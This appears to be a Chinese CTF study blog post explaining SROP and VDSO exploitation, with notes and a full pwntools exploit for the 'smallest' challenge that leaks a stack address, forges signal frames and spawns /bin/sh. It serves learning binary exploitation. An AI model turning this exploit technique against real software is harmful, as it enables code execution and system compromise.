---
title: CTF | srop 利用
date: 2018-09-19 16:49:01
tags:
---
SROP(Sigreturn Oriented Programming)
<!-- more -->



## SROP

### signal 机制
`32` 位的 `sigreturn` 的调用号为 `77`，`64` 位的系统调用号为 `15` 

过程：
推荐看 angelboy 的 ppt

```x86asm
x86
mov eax,0x77
int 0x80
x64
mov rax,0xf
syscall
```


### 利用要点
- 利用 sigreturn ,构造 syscall
- 控制所有寄存器
- 控制 ip 和 stack
- 需要足够的栈空间保存 signal frame
- 直接伪造 sigcontext 结构，全部 push 进 stack
- 将 ret address 设在 sigreturn syscall 的 gadget
- 将 signal frame 中的 rip(eip) 设在 syscall
- sigreturn 回来后就会执行我们自己构造的 syscall

### 要求
- 利用栈溢出控制栈内容
- 相应的地址
  - '/bin/sh'
  - signal frame
  - syscall
  - sigreturn


### 系统调用链
- 控制栈指针 rsp
- 把原来 rip 指向的 `syscall` gadget 换成 `syscall;ret` gadget 

基本思路：首先构造一个 `fake signal frame` 写入内存中，将然后将 `RSP` 指向这段空间，再发送 `rt_sigreturn` 信号（ 利用 eax 和 syscall 调用 sigreturn  控制 `rax=15` 32位是 0x77）。此时，内核会将构造好的 `fake signal frame` 取出，恢复。恢复后类似于ROP的方式，为 `syscall` 调用 `execve` 

### Sigreturn gadget
- x86
  - vdso <= 正常的 syscall handler 也會使⽤這邊
- x64
  - kernel < 3.3
    - vsyscall (0xffffffffff600000) <= 位置⼀直都固定
  - kernel >= 3.3
    - libc <= 正常的 syscall handler 也會使⽤這邊
- 利⽤ ROP 製造

`sigreturn` 的功能为 `push frame` 中的内容到寄存器。 `call sigreturn` 时，`esp` 肯定是指向 `frame` 之前的地址的第一个字节（首位的一些字节被覆盖也没事）。 `sigreturn_addr + str(frame)`


### 例题 smallest


程序很简单
调用 read

```x86asm
public start
start           proc near               ; DATA XREF:
xor     rax, rax
mov     edx, 400h       ; count
mov     rsi, rsp        ; buf
mov     rdi, rax        ; fd
syscall                 ; LINUX - sys_read
retn
```
相当于调用 `read(0,$rsp,400)` 有栈溢出
思路：
- 通过控制 `read` 读取的字符数来设置RAX寄存器的值，从而执行sigreturn
- 通过 `syscall` 执行 `execve("/bin/sh",0,0)` 来获取shell。

自己还写不出 exp，根据 ctf-wiki 的调一下，写出自己的理解。

有两种方法：
1. 利用 `syscall` 调用 `mprotect` 函数，将一段空间设置为RWX（可读可写可执行），然后将 `shellcode` ）写到这段空间中去，控制程序执行流跳转执行
首先利用 bof 布置  `mprotect` 的 `frame，利用` rop 回到程序开头置。根据 read 函数，控制 rax 的值来调用 `syscall` 实现 sigreturn，完成 mprotect 功能（利用 `syscall;retn` 和 rsp 实现 `syscall chain` 返回程序起始位置）。再读入 shellcode 执行即可。

2. 常规 SROP，在 stack 中读入 `'/bin/sh'`
说下2.

- 泄露地址是必要的，可以利用 `write` 函数。需要写入` '/bin/sh'`, `write` 系统调用号为1，所以绕过 `xor rax,rax` 刚好使调用号为 1.
- 构造 `frame`, 最后调用 `sigreture` 


#### 地址泄露脚本

1. 一开始要布置 main_addr*3
rsp rbp 返回地址

2. 第二次send,修改低字节部分，改为返回地址，绕过 xor rax rax 
泄露的是buf地址，也就是rsp ,那么最多存储16个字节(?)
 buf在栈上，构造 rsp 指向我们泄露的地址
设置 rax = 15 了：地址8位+7个padding,read 15个字节，作为返回值会存在 rax 中。
有点不明白：
`payload = p64(start_addr) * 3`  
`p64(start_addr) + 'a' * 8 + str(sigframe)` 
为什么 不设置 context.log_level='debug' 泄露地址就会出现错误： 那是因为程序写错了吧...
可是真的关了就错了...?? 为什么...

payload
```python
from pwn import *

context.log_level='debug'
context.arch = 'amd64'
p = process("./smallest")

main_addr = 0x4000b0
sys_addr = 0x4000be

payload = p64(main_addr)*3
p.send(payload)
p.send('\xb3')
stack_addr = u64(p.recv()[8:16])

log.success("leak stack addr:"+hex(stack_addr))

sigframe = SigreturnFrame() # syscall(rax,rdi,rsi,rdx)
sigframe.rax = constants.SYS_read 
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = sys_addr 
payload = p64(main_addr)+'a'*8+str(sigframe)
p.send(payload)

sigreturn = p64(sys_addr)+'b'*7 # rax = 15 
p.send(sigreturn)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve # syscall(execve,binsh_addr,0,0)
sigframe.rdi = stack_addr + 0x200 # binsh_addr 
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr 
sigframe.rip = sys_addr 
frame_payload = p64(main_addr)+'b'*8+str(sigframe)

print len(frame_payload)
payload = frame_payload+(0x200-len(frame_payload))*'\x00'+'/bin/sh\x00'
p.send(payload)
p.send(sigreturn)
p.interactive()

```
![leak](http://p6cwaqxnz.bkt.clouddn.com/smallest-leak-2.png)

#### pwnable.kr unexploitable
这道题的题解就看 pwnable.kr writeup 的博文吧


## VDSO 
我们再来学一下 VDSO
主要是为了 syscall 指令 sysenter/sysexit
- 提供 __kernel_vsyscall 來負責新型的 syscall
- 提供 sigreturn ⽅便在 signal handler 結束後返回
user code 

- sysenter 
  - 参数传递与 0x80 一样
  - 需要做 function prolog
    - push ebp;mov ebp ,esp 
  - stack pivot 的 gadget



### return to vdso 
直接利用 vdso 来做 ROP
- gadgets:
  - x86
    - sysenter
    - sysexit
  - x64
    有些版本的 kernel 可單靠 vdso 的 gadget 組成 execve

libc 中提到：
    "On many architectures the kernel provides a virtual DSO and gives
   **AT_SYSINFO_EHDR** to point us to it. As this is introduced for new
   machines, we should look at it for unwind information even if
   we aren't making direct use of it.  "

  **_rtld_global_ro**：This variable is similar to _rtld_local, but all values are
   read-only after relocation.
找到 vdso 地址
- 暴力
- 地址泄露

![vdso1](http://p6cwaqxnz.bkt.clouddn.com/vdso-1.png)
![vdso2](http://p6cwaqxnz.bkt.clouddn.com/vdso-2.png)
SROP 比ROP 的优势在于，ROP 需要用大量的 Gadgets 来完成寄存器的设置；而 SROP 只需要一块够大的内存空间，将 fake signal frame 部署到内存中即可。

例题 defcon 2015 fuckup
vdso+srop
稍后再看...

## 相关资料
[slides](https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf)

http://www.freebuf.com/articles/network/87447.html    
 https://bestwing.me/2017/03/20/stack-overflow-three-SROP/     
http://thinkycx.me/posts/20170429ichunqiu-pwn-smallest-writeup.html 讲了利用 mprotect 的思路      
https://blog.csdn.net/qq_31481187/article/details/73929569   
